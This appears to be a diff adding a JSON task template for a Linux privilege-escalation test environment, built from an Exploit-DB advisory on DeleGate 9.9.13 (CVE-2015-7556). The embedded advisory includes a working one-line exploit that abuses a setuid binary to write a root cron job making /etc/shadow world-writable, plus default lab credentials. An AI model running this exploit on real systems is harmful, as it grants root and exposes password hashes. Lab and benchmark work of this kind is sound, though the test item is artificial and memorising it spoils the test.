@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_39134",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: DeleGate 9.9.13 - Local Privilege Escalation (CVE-2015-7556;OSVDB-132147)\n\nExploit source code (39134.txt):\n```\nTitle: Local root vulnerability in DeleGate v9.9.13\nAuthor: Larry W. Cashdollar, @_larry0\nDate: 2015-12-17\nAdvisory: http://www.vapidlabs.com/advisory.php?v=159\nDownload Sites: http://delegate.hpcc.jp/delegate/\n                              http://delegate.org/delegate/\nVendor: National Institute of Advanced Industrial Science and Technology\nVendor Notified: 2015-12-17\nVendor Contact: y.sato@delegate.org ysato@etl.go.jp\nDescription: DeleGate is a multipurpose proxy server which relays various application protocols on TCP/IP or UDP/IP, including HTTP, FTP, Telnet, NNTP, SMTP, POP, IMAP, LPR, LDAP, ICP, DNS, SSL, Socks, and more. DeleGate mediates communication between servers and clients where direct communication is impossible, inefficient, or inconvenient.\n\nVulnerability:\nInstallation of delegate 9.9.13 sets some binaries setuid root, at least one of these binaries can be used to escalate the privileges of a local user.  The binary dgcpnod creates a node allowing a local unprivileged user to create files anywhere on disk.   By creating a file in /etc/cron.hourly a local user can execute commands as root.\n\nInstallation of software via source or binary distribution with option to not run as root results in a script set-subin.sh to run setting the setuid bit on four binaries.  In Linux distributions where this software is part of the package list these binaries are not setuid root. (archlinux)\n\nFrom documentation http://www.delegate.org/delegate/newbies-ja.shtml (translated to english):\nGo is included in the binary distribution, or DGROOT that you can build from the source to the location of preference, and then change the name if necessary. This is the DgRoot. In addition, if needed, you can rename the executable file of DeleGate to the name of the preference. This is the DgExe.\n\"In Unix version subin in if you want to use \"(such as when using a privileged port), do the following.\n\n  (3-2uk) $ cd DgRoot / subin\n          $ Sh setup-subin.sh\n\nlarry@f4ult:~/dg9_9_13/DGROOT/subin$ ls -l\ntotal 1916\n-r-sr-s--- 1 root  larry 384114 Oct 31  2014 dgbind\n-r-sr-s--- 1 root  larry 384598 Oct 31  2014 dgchroot\n-r-sr-s--- 1 root  larry 384161 Oct 31  2014 dgcpnod\n-rwxr-xr-x 1 larry larry 384114 Oct 31  2014 dgdate\n-rwxr-xr-x 1 larry larry  29066 Oct 31  2014 dgforkpty\n-r-sr-s--- 1 root  larry 384113 Oct 31  2014 dgpam\n-rwxr-x--- 1 larry larry    272 Oct 27  2014 setup-subin.sh\n\nThis script sets the setuid bit on four binaries:\n\nlarry@f4ult:~/dg9_9_13/DGROOT/subin$ cat setup-subin.sh\n#!/bin/sh\n\nSUBINS=\"dgpam dgbind dgchroot dgcpnod\"\nsudo sh -c \"chown root $SUBINS; chmod 6550 $SUBINS\"\nif [ $? != 0 ]; then\n  su root -c \"chown root $SUBINS; chmod 6550 $SUBINS\"\nfi\n\nCVEID: 2015-7556\n\n\nExploit Code:\n$ touch /tmp/rootme; chmod +x /tmp/rootme; ./dgcpnod /tmp/rootme /etc/cron.hourly/rootme; echo -e '#!/bin/bash \\n chmod 777 /etc/shadow' > /etc/cron.hourly/rootme\n```",
+  "cve": "CVE-2015-7556;OSVDB-132147",
+  "exploitdb_id": "39134",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_39134",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
